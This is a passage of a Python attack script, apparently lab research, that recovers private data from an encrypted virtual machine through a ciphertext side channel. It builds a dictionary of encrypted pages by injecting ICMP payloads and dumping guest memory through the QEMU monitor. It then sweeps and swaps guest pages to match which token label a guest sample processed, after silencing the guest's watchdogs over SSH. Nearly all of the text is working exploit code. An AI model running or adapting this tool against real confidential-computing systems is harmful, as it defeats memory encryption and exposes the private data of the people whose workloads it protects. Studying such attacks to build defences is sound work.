        sys.exit(1)
    with open(DICT_CACHE) as f:
        cache = json.load(f)
    log(f"[run-all] Loaded cache: {len(cache)} offset entries")

    r = subprocess.run(SSH_BASE + [f"cat {GUEST_SAMPLES_JSON}"],
                       capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        log_err(f"[run-all] failed to read {GUEST_SAMPLES_JSON}: {r.stderr.strip()}")
        sys.exit(1)
    samples = json.loads(r.stdout)
    log(f"[run-all] {len(samples)} samples loaded from guest:{GUEST_SAMPLES_JSON}")

    results_csv = RESULTS_CSV_BLIND if blind else RESULTS_CSV
    log(f"[run-all] output → {results_csv.name}")

    _CSV_FIELDS = ["timestamp", "index", "indication", "verdict",
                   "n_matches", "token_idx", "label", "tok_start",
                   "indication_gpa", "n_blocks", "N_est",
                   "skip_safe", "skip_unproven", "swaps"]

    # Only these verdicts mean "this sample is settled". INCONCLUSIVE and
    # ABORT must stay retryable: an INCONCLUSIVE sweep skipped at least one
    # page for a reason that does not prove the page was not the target, and an
    # ABORT never finished at all. Treating either as done would silently drop
    # the sample forever -- the failure mode this bookkeeping exists to stop.
    _TERMINAL = ("MATCH", "MULTI_MATCH", "NO_MATCH")
    done_indices: set[int] = set()
    if results_csv.exists():
        with open(results_csv, newline="") as f:
            rows = list(csv.DictReader(f))
        done_indices = {int(r["index"]) for r in rows
                        if r.get("verdict") in _TERMINAL}
        retry = {int(r["index"]) for r in rows} - done_indices
        log(f"[run-all] Resuming: {len(done_indices)} settled, "
            f"{len(retry)} to retry")

    need_header = not results_csv.exists() or results_csv.stat().st_size == 0
    csv_fh  = open(results_csv, "a", newline="")
    writer  = csv.DictWriter(csv_fh, fieldnames=_CSV_FIELDS)
    if need_header:
        writer.writeheader()

    n_done = n_match = 0
    session = GuestGpaSession()
    try:
        if not session.start():
            log_err("[run-all] failed to start guest --stdin-loop process")
            sys.exit(1)
        for i, sample in enumerate(samples):
            index      = sample["index"]
            indication = sample.get("indication", "")
            if index in done_indices:
                log(f"[run-all] {i + 1}/{len(samples)} index={index} — already done, skip")
                continue

            log(f"\n[run-all] {i + 1}/{len(samples)} index={index}  '{indication}'")

            base_gpa, N_actual, N_ind_actual, tok_start_g, header_c = \
                session.acquire(index, base_only=blind)
            if base_gpa is None:
                log_err(f"[run-all] index={index} — GPA acquisition failed")
                row = {"index": index, "indication": indication,
                       "verdict": "GPA_FAIL", "n_matches": 0,
                       "token_idx": "", "label": "", "tok_start": "",
                       "indication_gpa": "", "n_blocks": "", "N_est": ""}
            else:
                aborted = None
                try:
                    if blind:
                        matches, N_est = sweep_blind(base_gpa, cache, swap_tool)
                    else:
                        matches, N_est = sweep_blind(
                            base_gpa, cache, swap_tool,
                            N=N_actual, exact=True, N_ind=N_ind_actual,
                            tok_start_exact=tok_start_g, header_const=header_c)
                except SwapAbort as e:
                    # Guest memory is half-swapped and pages are stuck
                    # immutable. Nothing further can be trusted, and every
                    # extra swap grows the leak that eventually faults the
                    # host. Record the sample as retryable and stop the run.
                    aborted = str(e)
                    matches, N_est = [], None
                finally:
                    # Drop input_ids only after sweep/swap-back finishes.
                    session.release()
                stats = dict(LAST_SWEEP_STATS)
                if aborted:
                    row = {"index": index, "indication": indication,
                           "verdict": "ABORT", "n_matches": 0,
                           "token_idx": "", "label": "", "tok_start": "",
                           "indication_gpa": "", "n_blocks": "", "N_est": "",
                           **_skipcols(stats)}
                    row["timestamp"] = datetime.datetime.now().strftime(
                        "%Y-%m-%dT%H:%M:%S")
                    writer.writerow(row); csv_fh.flush()
                    log_err(f"[run-all] index={index} ABORT: {aborted}")
                    log_err("[run-all] The guest is no longer sound. Restart it "
                            "before resuming; this sample stays retryable.")
                    break
                if matches:
                    verdict = "MATCH" if len(matches) == 1 else "MULTI_MATCH"
                    row = {
                        "index": index,
                        "indication": indication,
                        "verdict": verdict,
                        "n_matches": len(matches),
                        "token_idx": ";".join(str(m["token_idx"]) for m in matches),
                        "label": ";".join(m["label"] for m in matches),
                        "tok_start": ";".join(str(m["tok_start"]) for m in matches),
                        "indication_gpa": ";".join(f"0x{m['ind_gpa']:x}" for m in matches),
                        "n_blocks": ";".join(str(m["n_blocks"]) for m in matches),
                        "N_est": N_est if N_est is not None else "",
                    }
                elif N_est is None:
                    row = {"index": index, "indication": indication,
                           "verdict": "BSEARCH_FAIL", "n_matches": 0,
                           "token_idx": "", "label": "", "tok_start": "",
                           "indication_gpa": "", "n_blocks": "", "N_est": ""}
                else:
                    # A miss only counts as NO_MATCH if every page was actually
                    # tested. Any unproven skip means the target may simply
                    # never have been looked at.
                    unproven = stats.get("skip_unproven", 0)
                    row = {"index": index, "indication": indication,
                           "verdict": "INCONCLUSIVE" if unproven else "NO_MATCH",
                           "n_matches": 0,
                           "token_idx": "", "label": "", "tok_start": "",
                           "indication_gpa": "", "n_blocks": "",
                           "N_est": N_est}
                    if unproven:
                        log_err(f"[run-all] index={index} INCONCLUSIVE: "
                                f"{unproven} page(s) skipped for reasons that do "
                                f"not rule them out — will be retried")

            row.setdefault("skip_safe", "")
            row.setdefault("skip_unproven", "")
            row.setdefault("swaps", "")
            if base_gpa is not None:
                row.update(_skipcols(stats))
            row["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
            writer.writerow(row)
            csv_fh.flush()
            n_done += 1
            if row["verdict"] in ("MATCH", "MULTI_MATCH"):
                n_match += 1
            log(f"[run-all] index={index}  verdict={row['verdict']}  "
                f"n={row['n_matches']}  label={row['label']}")
    finally:
        session.close()
        csv_fh.close()

    log(f"\n[run-all] Done: {n_done} processed, {n_match} matched → {results_csv}")


# ---------------------------------------------------------------------------
# Build parameters
# ---------------------------------------------------------------------------

def _get_build_params(token_ids: list[int]) -> list[int]:
    """
    Return phase indices 0 .. N-1 for an N-token label, skipping any phase
    whose target_landing = p*8 can NEVER contain a MIN_CLEAN_AES_BLOCKS-
    satisfying clean AES block, regardless of content.

    Each surviving phase p sends the ORIGINAL token order (no rotation) and
    aims for actual_landing == p*8, then registers at that landing. This
    matches the v2/know.txt contract: the first token of the label
    literally starts at the registered page offset — no AL-rot*8 inference.

    The skip matters for 2-tok (16B) labels specifically: phase 1
    (target_landing=8) makes the token pair straddle two 16B AES blocks —
    _clean_aes_blocks_inline(8, 16) is always empty — so sweep_blind can
    NEVER use that dict entry no matter what the label's content is.
    Building it anyway wastes an ICMP round-trip (~7-14s of mandatory
    mdelay-hold pacing per phase) and a dead dict_cache entry for nothing.
    4-tok+ labels are unaffected: every phase there already has >=1 clean
    block (see MIN_CLEAN_AES_BLOCKS comment), so this filter is a no-op
    for them.
    """
    L = len(token_ids) * 8
    return [p for p in range(len(token_ids))
            if len(_clean_aes_blocks_inline(p * 8, L)) >= MIN_CLEAN_AES_BLOCKS]


# ---------------------------------------------------------------------------
# Build dictionary
# ---------------------------------------------------------------------------

def build_dict(swap_tool: str) -> dict:
    """
    Capture ciphertext pages for all TOKEN_LABELS via QEMU dump only.

    For each (token_idx, phase p): original token order, byte_shift % L until
    actual_landing == p*8, then read_gpa that naturally-landed page.
    swap_tool is unused at build time (call-site compat) — SNP page-move
    relocate onto a shared ref_gpa was abandoned after repeated QEMU
    segfaults / stack-smashes under tens of --swap-back moves.

    Dict entry format:
      cache[hex(offset)][str(token_idx)] = {
          "gpa":        hex(dict_gpa),
          "cp_file":    str(cp_path),
          "cmp_len":    int,
      }
    """
    DICT_DIR.mkdir(exist_ok=True)

    if DICT_CACHE.exists():
        DICT_CACHE.unlink()
        log("[build] Removed existing dict_cache_v4.json")
    for f in DICT_DIR.glob("*.out"):
        f.unlink()
    log(f"[build] Cleared {DICT_DIR.name}/ — QEMU dump only (no swap relocate)")

    cache: dict = {}
    monitor_sock = read_gpa.connect_monitor()

    if not _guest_alive():
        if not _wait_guest_alive():
            monitor_sock.close()
            raise RuntimeError("[!] Guest SSH down at build start")
    try:
        ensure_mtu_9000()
    except Exception as e:
        log_err(f"[build] ensure_mtu_9000: {e}")
    drain_guest_rxbuf(rounds=3)
    if not _probe_icmp_frags():
        if not recover_guest_icmp("build start"):
            monitor_sock.close()
            raise RuntimeError("[!] Guest ICMP frag logging dead at build start")

    total_phases  = sum(len(_get_build_params(ids)) for _, ids in TOKEN_LABELS)
    phase_num     = 0
    drain_count   = 0
    byte_shift    = 0

    def _abort_guest_dead(where: str) -> None:
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)
        monitor_sock.close()
        raise RuntimeError(
            f"[!] Guest SSH down {where} (phase {phase_num}/{total_phases}) "
            f"— QEMU likely crashed; aborting build (cache saved)")

    for token_idx, (label, token_ids) in enumerate(TOKEN_LABELS):
        phases    = _get_build_params(token_ids)
        n_phases  = len(phases)
        n         = len(token_ids)
        L         = n * 8
        cmp_len   = L
        byte_shift %= L
        covered_residues: set[int] = set()
        # Residues _get_build_params actually attempts this label — NOT every
        # 8-aligned residue mod L, since phases with no clean AES block
        # (e.g. residue 8 for a 2-tok/16B label) are intentionally skipped.
        achievable_residues = {p * 8 for p in phases}
        payload_ids = list(token_ids)

        for phase in phases:
            phase_num += 1
            target_landing = phase * 8
            cp_name = f"t{token_idx}_p{phase}"
            cp_path = DICT_DIR / f"{cp_name}.out"

            if covered_residues >= achievable_residues:
                log(f"[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                    f"  phase={phase}/{n_phases}  [skip: all residues covered]")
                continue

            log(f"\n[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                f"  L={L}B  phase={phase}/{n_phases}  target_landing=0x{target_landing:x}"
                f"\n  payload={payload_ids}")

            if not _guest_alive():
                _abort_guest_dead("before phase")

            reg_start = None
            dict_gpa = None
            consecutive_icmp_fails = 0
            for _align_attempt in range(40):
                drain_count += 1
                if drain_count % DRAIN_EVERY == 0:
                    drain_guest_rxbuf(rounds=1)
                if drain_count > 1 and drain_count % 20 == 0:
                    log(f"  [pace] extra quiet after {drain_count} sends...")
                    _wait_icmp_hold("pace")
                    time.sleep(2)
                    drain_guest_rxbuf(rounds=2)
                    if not _guest_alive():
                        _abort_guest_dead("during pace")

                try:
                    frags = _acquire_retry(payload_ids, byte_shift=byte_shift)
                    consecutive_icmp_fails = 0
                except RuntimeError as e:
                    consecutive_icmp_fails += 1
                    log_err(f"  [!] Send failed: {e} "
                            f"(icmp_fail streak={consecutive_icmp_fails})")
                    if not _guest_alive():
                        _abort_guest_dead("during acquire")
                    if consecutive_icmp_fails >= 3:
                        if not recover_guest_icmp(
                                f"build phase {phase_num} after "
                                f"{consecutive_icmp_fails} ICMP failures"):
                            log_err("  [!] Guest ICMP unrecoverable — aborting build")
                            with open(DICT_CACHE, "w") as f:
                                json.dump(cache, f, indent=2)
                            monitor_sock.close()
                            raise
                        consecutive_icmp_fails = 0
                    else:
                        drain_guest_rxbuf(rounds=5)
                        time.sleep(_ICMP_HOLD_SEC)
                    dict_gpa = None
                    continue

                icmp_payload_len = ICMP_PAYLOAD_MIN
                candidates = []
                cum_payload = 0
                for i, (compound_gpa, off, size) in enumerate(frags):
                    header_skip = _frag_token_header_skip(
                        i, byte_shift, size, icmp_payload_len)
                    if i == 0 and _align_attempt == 0:
                        log(f"  [frag0] off={off} size={size} "
                            f"icmp_hdr={_icmp_hdr_bytes_in_frag0(size, icmp_payload_len)} "
                            f"header_skip={header_skip}")
                    frag_payload_start = compound_gpa + off + header_skip
                    frag_payload_end   = compound_gpa + off + size
                    frag_payload_len   = size - header_skip
                    if frag_payload_len <= 0:
                        continue
                    first_page = frag_payload_start // 4096
                    last_page  = (frag_payload_end - 1) // 4096
                    for p in range(first_page, last_page + 1):
                        if (p * 4096 >= frag_payload_start
                                and (p + 1) * 4096 <= frag_payload_end):
                            pos_in_payload = cum_payload + (p * 4096 - frag_payload_start)
                            landing = (L - pos_in_payload % L) % L
                            candidates.append((p * 4096, landing, off))
                    cum_payload += frag_payload_len

                if not candidates:
                    log_err(f"  [!] No clean interior page across "
                            f"{len(frags)} frag(s) — drain/recover and retry")
                    drain_guest_rxbuf(rounds=3)
                    time.sleep(_ICMP_HOLD_SEC)
                    if consecutive_icmp_fails >= 1:
                        recover_guest_icmp("no clean page")
                    dict_gpa = None
                    continue

                hit = [(g, l, o) for g, l, o in candidates if l == target_landing]
                if hit:
                    dict_gpa, actual_landing, _ = hit[0]
                    reg_start = actual_landing
                    if reg_start in covered_residues:
                        byte_shift = (byte_shift + 8) % L
                        log(f"  [collision] landing=0x{reg_start:x} already covered"
                            f" → byte_shift={byte_shift}, retrying")
                        dict_gpa = None
                        reg_start = None
                        continue
                    log(f"  dict_gpa=0x{dict_gpa:x}  actual_landing=0x{actual_landing:x}"
                        f"  reg_start=0x{reg_start:x}  byte_shift={byte_shift}"
                        f"  ({len(candidates)} candidates, {len(hit)} at target)")
                    break

                aligned = [(g, l, o) for g, l, o in candidates if l % 8 == 0]
                if not aligned:
                    _, l0, o0 = candidates[0]
                    shift_needed = l0 % 8
                    byte_shift = (byte_shift + (8 - shift_needed)) % L
                    log(f"  [align-fix] actual_landing=0x{l0:x} (%8={shift_needed},"
                        f" off={o0}, {len(candidates)} candidates)"
                        f" → byte_shift={byte_shift}, retrying")
                else:
                    _, al0, o0 = aligned[0]
                    delta = (target_landing - al0) % L
                    if delta == 0:
                        delta = 8
                    byte_shift = (byte_shift + delta) % L
                    log(f"  [aim] actual_landing=0x{al0:x} want=0x{target_landing:x}"
                        f" (off={o0}, {len(candidates)} candidates)"
                        f" → byte_shift+={delta} now {byte_shift}, retrying")
                dict_gpa = None
                continue
            else:
                log_err(f"  [!] Could not achieve landing=0x{target_landing:x} after "
                        f"{_align_attempt + 1} attempts — skipping phase")

            if dict_gpa is None or reg_start is None:
                continue

            covered_residues.add(reg_start)

            raw = read_gpa.read_page(monitor_sock, dict_gpa)
            if _parse_cp_text(raw) is None:
                log_err(f"  [!] dump gpa=0x{dict_gpa:x} malformed — skipping phase")
                continue
            cp_path.write_text(raw)
            log(f"  dump → {cp_path.name}  (dict_gpa=0x{dict_gpa:x})")
            actual_covered = []
            reg_off = reg_start
            while reg_off < 4096:
                off_key = hex(reg_off)
                if off_key not in cache:
                    cache[off_key] = {}
                cache[off_key][str(token_idx)] = {
                    "gpa":     hex(dict_gpa),
                    "cp_file": str(cp_path),
                    "cmp_len": cmp_len,
                }
                actual_covered.append(off_key)
                reg_off += L
            log(f"  registered {len(actual_covered)} offsets: "
                f"{actual_covered[:4]}{'...' if len(actual_covered) > 4 else ''}")

        covered = {off for off in achievable_residues
                   if str(token_idx) in cache.get(hex(off), {})}
        missing = achievable_residues - covered
        if missing:
            log_err(f"  [!] token_idx={token_idx} '{label}': incomplete coverage — "
                     f"missing residues {sorted(hex(m) for m in missing)}")

        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    monitor_sock.close()

    built = sum(len(v) for v in cache.values())
    log(f"[build] Complete. {built} (offset×token) entries in {DICT_CACHE}")
    log("[build] Draining guest ICMP receive buffer...")
    drain_guest_rxbuf()
    return cache



# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main() -> None:
    # Suppress guest watchdog noise
    ssh("echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/hardlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1",
        timeout=30)

    ensure_mtu_9000()

    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--build",        action="store_true", help="Build dictionary then exit")
    p.add_argument("--run-all",      action="store_true",
                   help="Run blind sweep over all filtered_samples.json entries")
    p.add_argument("--blind",        action="store_true",
                   help="Use binary search to find N (no guest N output required)")
    p.add_argument("--swap-tool",    default=str(SWAP_TOOL))
    p.add_argument("--log-file",     default=None)
    args = p.parse_args()

    global _log_fh
    if args.log_file:
        _log_fh = open(args.log_file, "a")

    if args.build:
        total_phases = sum(len(_get_build_params(ids)) for _, ids in TOKEN_LABELS)
        log(f"[build] {len(TOKEN_LABELS)} labels  {total_phases} phases"
            f"  ~{total_phases} sends (est.)")
        build_dict(args.swap_tool)
    elif args.run_all:
        run_all(args.swap_tool, blind=args.blind)
    else:
        p.error("specify --build or --run-all")

    if _log_fh:
        _log_fh.close()


if __name__ == "__main__":
    main()
